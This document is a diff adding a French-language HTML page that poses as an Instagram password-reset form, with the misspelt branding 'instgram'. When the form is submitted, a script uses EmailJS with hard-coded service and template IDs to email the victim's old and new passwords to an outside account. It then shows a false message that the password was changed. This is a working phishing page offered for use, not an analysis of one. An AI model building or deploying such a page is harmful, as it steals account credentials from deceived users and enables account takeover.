@@ -1,0 +1,102 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>instgram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<header>
+    <a href="#" class="logo">COMPTE<span>INSTGRAM</span></a>
+</header>
+
+<main>
+    <section class="contact">
+
+        <div class="section-title">
+            <span>modifier votre mot de passe</span>
+            <h1>Instgram</h1>
+            <p>récuperer votre compte instgram</p>
+        </div>
+        <div class="logo-container">
+    <img src="image1.webp" alt="Logo Vitrine" class="vitrine-logo">
+</div>
+
+        <form id="contactForm">
+
+            <label for="nom">ancien mot de passe</label>
+            <input type="text" id="nom" name="nom"
+                   placeholder="ancien mot de passe" required>
+
+            <label for="prenom">modifier mot de passe</label>
+            <input type="text" id="prenom" name="prenom"
+                   placeholder="modifier mot de passe" required>
+
+            <label for="avis">confirmer mot de passe</label>
+            <textarea id="avis" name="avis"
+                      placeholder="confirmer mot de passe"
+                      rows="5" required></textarea>
+
+            <label class="consent">
+                <input type="checkbox" required>
+                J'accepte la modification
+            </label>
+
+            <button type="submit" id="sendBtn">Modifier</button>
+
+            <p id="message" role="status"></p>
+
+        </form>
+
+    </section>
+</main>
+
+<footer>
+    <p>© 2026 copyright- instgram -Tous droits réservés</p>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+emailjs.init({
+    publicKey: "Hg-zNf-68sKKbpiy5"
+});
+
+const form = document.getElementById("contactForm");
+const message = document.getElementById("message");
+const sendBtn = document.getElementById("sendBtn");
+
+form.addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    sendBtn.disabled = true;
+    sendBtn.textContent = "Envoi en cours...";
+
+    emailjs.sendForm(
+        "service_oov2lri",
+        "template_ru8j1vh",
+        form
+    )
+    .then(function() {
+        message.textContent = "Votre mot de pass a été modifier avec succées";
+        message.className = "success";
+        form.reset();
+    })
+    .catch(function(error) {
+        console.error(error);
+        message.textContent = "Une erreur est survenue. Réessayez.";
+        message.className = "error";
+    })
+    .finally(function() {
+        sendBtn.disabled = false;
+        sendBtn.textContent = "Envoyer";
+    });
+});
+</script>
+
+</body>
+</html>
